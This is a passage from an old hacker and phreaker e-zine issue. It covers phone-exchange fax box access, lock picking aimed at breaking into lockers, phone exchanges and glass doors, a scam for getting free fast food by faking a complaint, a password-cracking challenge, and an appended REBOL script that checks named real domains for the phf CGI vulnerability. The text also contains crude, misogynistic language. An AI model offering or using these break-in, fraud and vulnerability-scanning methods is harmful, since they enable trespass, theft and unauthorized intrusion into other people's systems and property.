+  Also, some numbers in the 9221xxxx exchange are fax boxes. Dial a few 
+  numbers there until you get a message saying some crap about faxes and use
+  the same number/passcode combo as above.
+  There ya go
+  Have fun
+
+<=-------------------------------------------------------------------------=>
+
+  5.0 -[ Anarchy ]-
+  -----------------
+
+  5.1 - Lock Picking
+
+  The following was taken basically word for word (except the introduction,
+  and other comments) from 'Secrets of Lock Picking' by Steven Hampton. For 
+  more detailed explanations see the web site section further below.
+
+  Introduction - lock picking can be a VERY useful skill to know, especially
+  for a phreak that can't get their hands on that ellusive set of keys. I 
+  will only delve into the pin tumbler type lock, since these are the most
+  common. After reading this text, you should be into lockers, pod's,
+  exchanges, and various other places that u are not supposed to be. By using
+  the following technique, Deicidal and I were into all types of padlocks,
+  pods, lockers, exchanges,  and through glass sliding doors... Have phun ;)
+
+  How a lock works - as i said before, the most commonly used lock today is 
+  the pin tumbler. A series of pins that are divided at certain point must be
+  raised to these dividing point in relationship to the separation between 
+  the cylinder wall and the shell of the lock by a key cut for that
+  particular series of pin divisions. Thus the cylinder can be turned, and 
+  the mechanism can be locked or unlocked. (see images m2lkpk1.gif and 
+  m2lkpk2.gif)
+
+  Picking - by picking a lock, you simply replace the function of a key with 
+  a pick that raises the pins to their 'breaking point', and using a tension 
+  wrench you rotate the cylinder to operate the cam at the rear of the lock's
+  cylinder to unlock the mechanism.
+
+  Tools - All that is required is a small flathead screwdriver, and a safety
+  pin that is used like a 'hook' pick. The last half inch of the screwdriver
+  is bent at a 45 degree angle so as to allow easy entry for the saftey pin
+  pick. I recommend buying a 12 piece pick set if you are serious about lock
+  picking, it makes it a HELL of alot easier (see web sites listed below). 
+
+  How to pick a pin tumbler lock - Without using the tension wrench, slip 
+  the pick into the lock. The 'hook' of the pick should be towards the
+  tumblers. Try to feel the last tumbler of the lock. When you feel the back
+  tumbler, slowly raise it with a slight prying motion of the pick. Release
+  it, but keep the pick in the lock on the rear tumbler. Now insert the
+  wrench, allowing room for the pick to manipulate all the pins. It should be
+  placed at the bottom of the cylinder, apply a gentle clockwise pressure to
+  the tension wrench (see images m2lkpk_1.gif and m2lkpk_2.gif to see what it
+  looks like.. with a real pick set). Slowly raise the back tumbler with the
+  pick, and a minute click will be felt, and heard when it breaks. It will
+  loose its springiness when this occurs. Repeat the process with each pin, 
+  moving outwards, and eventually the cylinder should turn (see images 
+  m2lkpk3.gif, and m2lkpk4.gif). That is all there is to it!
+
+  Web Sites - the above is only intended to be an introduction to lock
+  picking, for a more detailed explanation, visit the following sites (the
+  MIT guide is one of the best):
+
+  http://home.it.net.au/~hardguy/text/mitguide.pik
+    - the famed MIT guide to lock picking!!
+  http://www.lock-picks.com/
+    - dedicated to just lock picking not like the one below
+  http://www.lockpicking.com/
+    - contains lots of 'spy' stuff
+  http://stronghold.netnation.com/~eclect/locksmith/
+    - a 'locksmithing' (same as picking) cource
+  http://www.networkx.net/~spook/lockpick.html
+    - various books on lock picking
+
+
+  5.2 Free Fast Food
+  ------------------
+
+  You one of those poor bastards that can't afford to buy a whole meal at
+  kfc, HJ's or the like?? and just go for a large chips?? Well heres how u
+  can get more of those greasy, krusty chips! I've only done this once at
+  KFC, and I've made a scene b4 at MacDonalds, and gotten a whole meal for
+  free (trust me, its not worth the embarassment.. but hey.. if i'm a bum, i
+  know how to get food!, if u can call it food?)
+
+  What you do, is order a large chips.. got outside, eat half of them.. then
+  go back into the store and say something to the effect of 'These chips are
+  too salty, and i cant eat them, theyre sickening' the dumb fast food girl
+  will probably go and ask the manager what to do.. so u wait.. and they'll
+  come back and give u a whole new pack, and ask u if u want salt on them
+  this time. (i said yeah, just a LITTLE bit.. and the bitch put a heap on
+  again!).
+
+  There u are.. one and a half large chips, for the cost of one :P Dont eat
+  em all at once!!!
+
+  PS - always ask for NO ICE !!! 
+
+<=-------------------------------------------------------------------------=>
+
+  6.0 -[ Challenge ]-
+  -------------------
+
+  6.1 - JavaScript Password Box
+  
+  As i mentioned in the first issue there will be a challenge for you to try
+  before the next one comes out. This first one is a JavaScript Password 
+  scheme which I found at fravia's (http://fravia.org, or try 
+  http://www.phase-one.com.au/fravia/). To get to this challenge, click on 
+  the Cat In The Hat on the page (www.aloc.cc), if you can crack it, you will
+  be rewarded with the phone numbers from the payfone log books (Sorry to all
+  the phreaks who dont crack.. but this is the only way i can release them
+  without them being abused... it makes people actually do something to get
+  them).
+
+  If you manage to crack it, please email me a message saying you cracked it
+  with the numbers from the page (for proof), and if you don't crack it, also
+  send me an email describing the process you used, and how far you got.
+  If i get alot of email from people who can't crack it, I will provide 
+  hints, and help based on their email in the next issue.. Good Luck!
+
+  PS - check out http://fravia.org, or try
+  http://www.phase-one.com.au/fravia/ for a headstart ;)
+
+<=-------------------------------------------------------------------------=>
+
+  7.0 -[ Conclusion ]-
+  --------------------
+
+  That's it for another issue. In the first i mentioned that there would be
+  some DTMF tunes to play.. well i didnt get any sent in.. and i dont know 
+  any.. oh well, u get that. Next issue will have more on Echelon (by Hool),
+  another CGI exploit, an explanation of UNIX text editors (sed, grep, etc),
+  a detailed explanation of REBOL, and various other pieces of information.
+ 
+  Hope u enjoyed it, AND learned something...
+
+                                                Phrost Byte
+
+<=-------------------------------------------------------------------------=>
+  
+  Appendix I
+  ----------
+
+  Due to time, I cant explain this script in more detail. But as mentioned
+  above, there will be an article on REBOL in the next issue, and the script
+  will also be modified and improved. For now, visit www.rebol.com to get
+  the program to run this script, and try learning some it yourself.
+
+  The script works by connecting to the site, and seeing if phf is there.
+  If it is, you get the message Found! if not, it displays Not Found. As
+  mentioned in the phf article, some sites have put the message 'Smile you're
+  on camera' in place of phf, if this is the case, the scanner will still 
+  return Found!, you have to go through the list and test the Found! ones
+  by hand, to see if they are in fact vulnerable.
+
+  To use this script, just paste your list of domains in between 'sites [' 
+  and ']' and alter the statement 'for where 1 5 1 [' to reflect the amount
+  of sites in the sites [] list. eg, i have included 5 sites already, if i
+  add another to sites [] , i have to alter 'for where 1 5 1 [' to read
+  'for where 1 6 1 [' get it? if not, dont bother with it.
+
+  To run, in REBOL, type:
+  >>do %phfscn.r
+
+  --- phfscn.r --- cut here ---
+  REBOL [
+    Title: "phf Scanner"
+    Author: "Phrost Byte"
+    File: %phfscn.r
+    Purpose: {To scan a list of domains for the phf vulnerability.}
+  ]
+
+  secure none
+
+  sites: [
+    www.accessin.com.au/cgi-bin/phf
+    emerald.crystal.com.au/cgi-bin/phf
+    www.dialix.com.au/cgi-bin/phf
+    www.dmn.com.au/cgi-bin/phf
+    www.wanet.com.au/cgi-bin/phf
+  ]
+
+  for where 1 5 1 [
+    found: exists? the_url: join http:// [ pick sites where ]
+    prin ["Searching for " pick sites where " : "]
+    if found == yes [ print "Found!"]
+    if found == no [ print "Not Found"]
+  ]
+
+  print ["Finished searching."] 
+  --- phfscn.r --- cut here ---
+
+<=-------------------------------------------------------------------------=>
+
+  Proudly Brought To You By:
+
+      ,,,,,,,,,,,,                                                           
+     =///////////;             :///               ,,,                        
+     :///////////:            .///;              ://;                        
+     ////////////=            ,///:              ;//=                        
+     ////////////-            -///=              ///=                        
+     ............   .=::=,    =///-   ,=:::-   ,=///:-. .--- ,:-   ,::- -::= 
+   :%;,            -;/////,   :///,  ://////=  ;//////, -///,//=  =////:///: 
+  X####$-         :///;////.  ;///  =///:;///, ///////. =//;://- -/////////: 
+ ;######/        -///- -///:  //// .///= .;;;,.;////;:  ://////- ;///;;////- 
+ $######=        ;//;   ;//; .///; ,///;=.      ;//;    ;////;:.,///: .;///- 
+ X######-       ,////;;;//// ,///: .//////:,    ///=    ////=   :///.  :///. 
+ +######    =   =//////////; -///=  :///////=  ,///=   .///;    ////   :///. 
+ ;######    $X  :///=------, =///,   -=;/////. -///-   ,///-   .///:   ;///  
+ .#####H    X#+ =///,  .,,,  :///,.,,,. ,;///. =///-   -///-   ,///;  -///:  
+  +####$    ###,-///:..:///. ;/// ,///=  ;//;  =/////. =///.    ////::////:  
+  .M###+    ###H./////////= .//// .////;;///=  =////;  :///.    ;/////////-  
+   /###:   =####--///////-  .///:  =///////=   -////;  ;//;     ,/////-///,  
+   .X##HXXXM####X .=;;=-.    ...    ,=:;==.     ,===,  ....      ,:;=. ...   
+    M###########                                                             
+     =###########-                                                           
+      -M#########=    M  A  K  I  N  G    L  I  F  E    E  A  S  I  E  R
+       ,H########=                                                           
+         :######H                                                            
+          .;HMM%.                            
+                                
+<=-------------------------------------------------------------------------=>
